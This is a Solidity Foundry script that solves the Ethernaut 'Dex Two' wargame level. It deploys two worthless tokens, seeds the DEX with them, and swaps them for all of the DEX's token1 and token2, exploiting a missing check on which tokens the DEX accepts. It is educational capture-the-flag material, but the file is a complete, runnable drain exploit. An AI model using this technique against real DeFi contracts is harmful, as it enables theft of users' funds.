// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {DexTwo, SwappableTokenTwo} from "../src/EthernautDexTwo.sol";

contract DexTwoSolution is Script {
    DexTwo dex = DexTwo(0x08555B17D9Acc0c93d5b19aDEC7b19fA36BEFfea);
    SwappableTokenTwo token3;
    SwappableTokenTwo token4;
    address token1 = dex.token1();
    address token2 = dex.token2();
    address myAddress = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        token3 = new SwappableTokenTwo(address(dex), "Token3", "TKN3", 1000);
        token4 = new SwappableTokenTwo(address(dex), "Token4", "TKN4", 1000);
        token4.transfer(address(dex), 100);
        token3.transfer(address(dex), 100);
        dex.approve(address(dex), type(uint256).max);
        token4.approve(myAddress, address(dex), type(uint256).max);
        token3.approve(myAddress, address(dex), type(uint256).max);
        dex.swap(address(token3), token1, 100);
        dex.swap(address(token4), token2, 100);
        vm.stopBroadcast();
        console.log(
            "Current token1 balance in dex contract",
            dex.balanceOf(token1, address(dex))
        );
        console.log(
            "Current token2 balance in dex contract",
            dex.balanceOf(token2, address(dex))
        );
        console.log(
            "Current token3 balance in dex contract",
            dex.balanceOf(address(token3), address(dex))
        );
        console.log(
            "Current token4 balance in dex contract",
            dex.balanceOf(address(token4), address(dex))
        );
    }
}
